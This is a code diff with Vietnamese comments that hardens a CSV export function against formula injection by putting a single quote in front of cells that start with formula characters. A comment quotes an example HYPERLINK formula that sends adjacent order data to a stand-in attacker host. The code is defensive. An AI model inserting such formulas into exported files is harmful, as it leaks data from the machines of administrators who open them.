@@ -1,8 +1,18 @@
 import type { AdminOrder, AdminUser } from './admin-client';
 
+/** Ký tự mở đầu khiến Excel/Google Sheets coi ô là CÔNG THỨC. */
+const FORMULA_START = /^[=+\-@\t\r]/;
+
+/**
+ * File này chứa ghi chú do khách tự nhập. Không vô hiệu hoá công thức thì một ghi chú kiểu
+ * `=HYPERLINK("https://kẻ-xấu/?d="&A1,"Bấm vào")` sẽ chạy ngay trên máy quản trị viên khi họ mở
+ * file vừa xuất — đọc được cả bảng dữ liệu đơn hàng bên cạnh. Thêm dấu nháy đơn ở đầu để Excel
+ * đọc như văn bản (dấu này không hiện trong ô).
+ */
 function escapeCsvCell(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const str = String(value);
+  let str = String(value);
+  if (FORMULA_START.test(str)) str = `'${str}`;
   if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
     return `"${str.replace(/"/g, '""')}"`;
   }
